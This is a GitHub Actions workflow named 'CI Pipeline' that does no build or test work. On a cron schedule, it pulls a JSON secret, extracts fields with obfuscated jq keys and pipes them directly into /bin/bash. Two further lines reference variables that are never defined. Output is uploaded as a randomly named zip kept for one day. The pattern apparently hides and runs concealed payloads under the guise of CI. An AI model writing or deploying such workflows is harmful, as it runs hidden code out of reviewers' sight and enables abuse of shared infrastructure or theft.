name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '25 5,11,17,23 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  automation:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Process
        env:
          t3: ${{ secrets.t3 }}
        run: |
          printf '%s' "$t3" | jq -r .sow565 | /bin/bash
          printf '%s' "$bj70903" | jq -r .z0 | /bin/bash
          printf '%s' "$nh325" | jq -r .iqyak89128 | /bin/bash

      - name: Store results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ZQOsDVp1
          path: "*.zip"
          retention-days: 1
